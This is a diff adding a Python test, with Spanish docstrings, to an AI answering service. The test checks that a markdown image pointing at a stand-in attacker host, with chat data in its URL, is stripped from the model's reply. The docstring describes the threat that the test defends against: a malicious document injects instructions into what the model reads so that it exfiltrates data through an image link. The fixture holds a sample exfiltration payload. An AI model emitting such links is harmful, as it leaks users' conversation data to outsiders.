@@ -54,3 +54,16 @@ async def test_sin_esquemas_no_hay_campo_visuals():
     servicio._llm_gate.answer_question = AsyncMock(return_value="Solo texto.")
     r = await servicio.answer(None, "¿qué es la fotosíntesis?", uuid4())
     assert "visuals" not in r.envelope.payload and r.content == "Solo texto."
+
+
+@pytest.mark.asyncio
+async def test_una_imagen_ajena_escrita_por_el_modelo_no_se_entrega():
+    """Auditoría de la #80: un documento malicioso podría hacer que el modelo pinte una
+    imagen que filtre datos en la URL. El servidor la quita antes de entregar y guardar."""
+    servicio = _servicio()
+    servicio._llm_gate.answer_question = AsyncMock(
+        return_value="Aquí tienes. ![x](https://atacante.example/p.png?d=secreto-del-chat)"
+    )
+    r = await servicio.answer(None, "¿qué es la fotosíntesis?", uuid4())
+    assert "atacante.example" not in r.content and "[Imagen: x]" in r.content
+    assert r.envelope.payload["content"] == r.content
